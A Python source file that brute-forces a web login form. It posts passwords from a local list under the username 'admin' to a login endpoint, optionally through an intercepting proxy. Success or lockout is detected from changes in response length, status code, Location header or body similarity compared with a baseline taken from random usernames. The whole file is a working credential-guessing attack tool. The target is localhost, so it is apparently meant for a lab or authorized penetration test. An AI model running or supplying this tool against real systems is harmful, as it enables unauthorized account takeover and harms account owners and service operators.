import requests
import time
from difflib import SequenceMatcher

username = "admin"

url = "http://127.0.0.1:8989/login"

path_to_password_list = "C:\\data\\credentials\\passwords.txt"

# control how much length variance you want to ignore:
length_variance_acceptance = 10

# control how sensitive the response body comparison detection logic is:
comparison_sensitivity = 0.82

# Control whether proxy should be used:
proxy = False

# be polite and introduce a time delay between each request:
# default is 1 mS
time_delay = 0.001

# proxy settings here:
http_proxy = "http://127.0.0.1:8080"
https_proxy = "https://127.0.0.1:8080"

proxies = {
    "http": http_proxy,
    "https": https_proxy
}

# read in a password list file and create a list from these:
with open(path_to_password_list, 'r') as file:
    payloadList = file.read().splitlines()

# used to compare the baseline body with each received body:
def compare_two_strings(a, b):
    return SequenceMatcher(None, a, b).ratio()

sampleData = ["ydgwj", "87234yrwhe", "9438r3jkhfgh4r", "87y4rfghfgh3iu4r", "934r3rkjhisdkfjh", "sdjfhsfhi",
              "234y7ru34khrkjh", username]

init_response_lengths = []
init_response_statusCodes = []
init_response_locations = []

print("[i] Username:             " + username)
print("[i] Password list:        " + path_to_password_list)

print("[i] Running init loop to get some sample data about the login responses")

password = "3847yrikwehrkwjh"
location_header = False

# the initialisation loop:
for testusername in sampleData:
    time.sleep(time_delay)
    cookies = {"JSESSIONID.06b898ae": "node0do08h9p1n5u446x64ay8ppf04.node0"}
    headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\""}
    data = {"username": testusername, "password": password}

    if proxy:
        res = requests.post(url, headers=headers, data=data, cookies=cookies, proxies=proxies,
                            verify=False, allow_redirects=False)
    else:
        res = requests.post(url, headers=headers, data=data, cookies=cookies, verify=False,
                            allow_redirects=False)
    location_header = False
    for h in res.headers:
        if h.lower() == "location":
            location_header = True

    init_response_location_value = 'N/A'
    if location_header:
        init_response_location = len(res.headers["location"])
        init_response_location_value = res.headers["location"]
        init_response_locations.append(init_response_location)

    init_response_length = str(len(res.content))
    init_response_statusCode = str(res.status_code)
    init_response_body = str(res.content)

    init_result = "[i] Length: " + init_response_length + " Status: " + init_response_statusCode + " Location: " + init_response_location_value
    init_response_lengths.append(init_response_length)
    init_response_statusCodes.append(init_response_statusCode)
    print(init_result)

init_max_lengths = max(init_response_lengths)
init_min_lengths = min(init_response_lengths)
init_length_variance = int(init_max_lengths) - int(init_min_lengths)

init_max_status_code = max(init_response_statusCodes)
init_min_status_code = min(init_response_statusCodes)
init_status_variance = int(init_max_status_code) - int(init_min_status_code)

if location_header:
    init_max_locations = max(init_response_locations)
    init_min_locations = min(init_response_locations)
    init_locations_variance = int(init_max_locations) - int(init_min_locations)

if init_length_variance == 0:
    print("[i] No length variance found")
    print("[i] Response length: " + init_response_length)
else:
    print("[i] Length variance detected: " + str(init_length_variance))

if init_status_variance == 0:
    print("[i] No status variance found")
    print("[i] Status code: " + init_response_statusCode)
else:
    print("[i] Status code variance detected: " + str(init_status_variance))

if location_header:
    if init_locations_variance == 0:
        print("[i] No location variance found")
        print("[i] Location: " + init_response_location_value)
    else:
        print("[i] Status code variance detected: " + str(init_status_variance))
        print("[i] Location: " + init_response_location_value)

count = len(payloadList)
loopCounter = 0

print("[i] Starting login brute force with " + str(count) + " passwords.")

results = []
# the main loop:
for password in payloadList:
    time.sleep(time_delay)
    data = {"username": username, "password": password}

    if proxy:
        res = requests.post(url, headers=headers, data=data, cookies=cookies, proxies=proxies,
                            verify=False, allow_redirects=False)
    else:
        res = requests.post(url, headers=headers, data=data, cookies=cookies, verify=False,
                            allow_redirects=False)

    response_length = str(len(res.content))
    response_statusCode = str(res.status_code)
    response_body = str(res.content)
    if location_header:
        response_location_value = res.headers["location"]
        result = "[!] Length: " + response_length + " Status: " + response_statusCode + " Location: " + response_location_value + " Username: " + username + ":" + password
    else:
        result = "[!] Length: " + response_length + " Status: " + response_statusCode + " - Credentials: " + username + ":" + password

    if response_length != init_response_length:
        #print("[!] Length difference detected")
        #print(result)
        if int(response_length) > int(init_response_length) + int(length_variance_acceptance):
            print("[!] Sufficient length difference detected")
            print(result)
            break
        if int(response_length) <= int(init_response_length) - int(length_variance_acceptance):
            print("[!] Sufficient length difference detected")
            print(result)
            break
    if response_statusCode != init_response_statusCode:
        print("[!] Status code difference detected")
        print(result)
        break
    if location_header:
        response_location_value = res.headers["location"]
        if response_location_value != init_response_location_value:
            print("[!] Location difference detected")
            print(result)
            break

    if "lock" in response_body.lower():
            print("[!] Potential Account Locking detected")
            print("[!] Attempt count: " + str(loopCounter + 1))
            print(str(response_body))
            print(result)
            break

    if init_response_body != response_body:
        ratio = compare_two_strings(init_response_body, response_body)
        if ratio < comparison_sensitivity:
            print("[!] Body response difference detected: " + str(ratio))
            print("[!] Baseline:  " + str(init_response_body))
            x = SequenceMatcher(None, init_response_body, response_body)
            m = x.get_matching_blocks()
            response_body_new = ""
            i = 0
            for m in x.get_matching_blocks():
                if m.b > i:
                    response_body_new += f"\033[91m{response_body[i:m.b]}\033[0m"
                response_body_new += response_body[m.b:m.b + m.size]
                i = m.b + m.size
            print("[!] Latest:    " + response_body_new)
            print(result)
            break

    loopCounter += 1
    if (loopCounter % 100) == 0:
        print("[i] Count: " + str(loopCounter) + " of " + str(count))
